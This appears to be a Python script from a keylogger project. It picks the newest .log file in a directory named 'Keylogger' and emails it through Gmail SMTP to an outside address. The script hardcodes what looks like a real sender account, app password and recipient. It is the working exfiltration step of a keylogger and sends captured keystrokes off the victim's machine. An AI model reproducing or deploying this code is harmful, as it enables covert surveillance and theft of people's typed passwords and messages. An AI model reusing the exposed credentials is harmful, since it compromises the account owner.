import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def send_email(sender_email, sender_password, receiver_email, subject, body, attachment_path):
    # Set up the MIME
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject

    # Attach the body to the email
    message.attach(MIMEText(body, 'plain'))

    # Open and attach the file
    with open(attachment_path, "rb") as attachment:
        part = MIMEApplication(attachment.read(), Name=os.path.basename(attachment_path))
        part['Content-Disposition'] = f'attachment; filename="{os.path.basename(attachment_path)}"'
        message.attach(part)

    # Connect to the SMTP server and send the email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(message)

def send_most_recent_log(sender_email, sender_password, receiver_email, directory):
    # Get the list of all files in the directory
    files = os.listdir(directory)
    
    # Filter the files to include only those ending with ".log"
    log_files = [file for file in files if file.endswith('.log')]
    
    # Sort the files by modification time and get the most recent one
    most_recent_log = max(log_files, key=lambda x: os.path.getmtime(os.path.join(directory, x)))
    
    # Path to the most recent log file
    log_file_path = os.path.join(directory, most_recent_log)
    
    # Send the email with the most recent log file as attachment
    send_email(sender_email, sender_password, receiver_email, 'Most Recent Log', 'Please find the most recent log file attached.', log_file_path)

# Example usage:
sender_email = 'np01ai4a220032@islingtoncollege.edu.np'  # Sender's email address
sender_password = 'qqwb qtmo ozyi plyg'      # Sender's email password
receiver_email = 'hyiambibek.282@gmail.com' # Recipient's email address
directory = '/home/graahand/Keylogger/linux'  # Directory containing log files
send_most_recent_log(sender_email, sender_password, receiver_email, directory)
